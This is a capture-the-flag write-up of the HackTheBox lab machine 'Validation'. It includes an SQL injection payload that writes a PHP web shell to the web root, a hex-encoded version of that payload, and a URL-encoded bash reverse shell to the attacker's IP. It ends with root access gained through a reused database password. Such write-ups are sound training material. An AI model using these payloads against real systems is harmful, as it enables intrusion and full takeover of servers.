---
title: Validation
date: 2023-10-23 14:11:00 +0200
categories: [Writeups, HackTheBox]
tags: [sqli, rce]
img_path: /assets/images/Validation
---


This machine is an easy HTB machine, which shows a registration form to join the UHC qualifiers. It has a SQL injection vulnerability, which will allow us to upload a custom file with some PHP code to run shell commands in the machine. Once inside the machine, we will be able to read a password and switch to the root user.

----------------------

## Enumeration

The IP of the machine is 10.10.11.116. We will run **nmap** to discover open ports:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.116 -oG allPorts
```

![open ports](open-ports.png)

Let's gather more information about these ports using nmap again. We will run this command, which will try to identify services and versions running on those ports:

```bash
sudo nmap -sCV -p22,80,4566,8080 -oN targeted
```

Once the scan finishes, we can see the output in the file `targeted`:

![scan results](targeted.png)

As we don't have any credentials, and the pages on ports 4566 and 8080 are not available, let's dive into port 80.

When we visit the webpage, we are presented with this:

![webpage](webpage.png)

## Shell as www-data and user flag

If we try to register a username, for instance, `manbolq` and press "Join now", we will be redirected to this webpage:

![account webpage](account.png)

This starts looking juicy. It seems to show all the users that are registered for Brazil. Let's register another user and intercept the request with **BurpSuite**:

![burpsuite](burpsuite.png)

The query used to show all the users in a country, may be like the following:

```sql
SELECT username FROM users WHERE country=<contry>
```

If the `country` parameter is not properly sanitized, we may be able to inject some malicious code. Let's try to change the country parameter to the following:

```
country=Brazil' union select '<?php system($_GET["cmd]); ?>' into outfile '/var/www/html/cmd.php'-- -
```

After sending the request, we can see that we get a cookie. If we set that cookie in out browser, this is what we'll see:

![error webpage](error.png)

We see an error in the PHP file, so the SQL injection looks promising. If we browse to the `cmd.php` endpoint, we see that there is no file. Maybe if we try to change the PHP code to hexadecimal it will work. Let's give it a try. We can execute this command:

```bash
echo -n '<?php system($_GET["cmd]); ?>' | xxd -p -u
```

and we will get the hexadecimal string: `0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E`. Let's try to send this query now:

```
country=Brazil' union select 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E into outfile '/var/www/html/cmd.php'-- -
```

If we set the new cookie, and browse the web, we'll still get the same error. However, if we go to the `cmd.php` endpoint...

![cmd](cmd.png)

Yay! We created the file. We can now use the `cmd` parameter through GET requests to execute arbitrary commands. For example, if we try to execute `id`:

![id](id.png)

There it is. We are the user www-data. Let's try to get a reverse shell!

![revshell](revshell.png)

> I've visited the URL: http://10.10.11.116/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.18/443%200%3E&261%22. **We have to urlencode some characters**
{: .prompt-info }

If we cd into `/home/htb`, we can read the **user flag**.

![user flag](user.png)

## Privilege escalation

We are in the `/var/www/html/` directory. If we execute the `ls` command, we'll see a file called `config.php`. Let's take a look at it:

![config](config.png)

It looks like the config file to connect to the database instance. We see an username and a password. We may try to change to root user using that password, because there might credentials reuse:

![root](root.png)

And yep, definately. So now we are root and we can read the flag under the `/root` directory.

This is all for the machine Validation. I hope you found it useful!
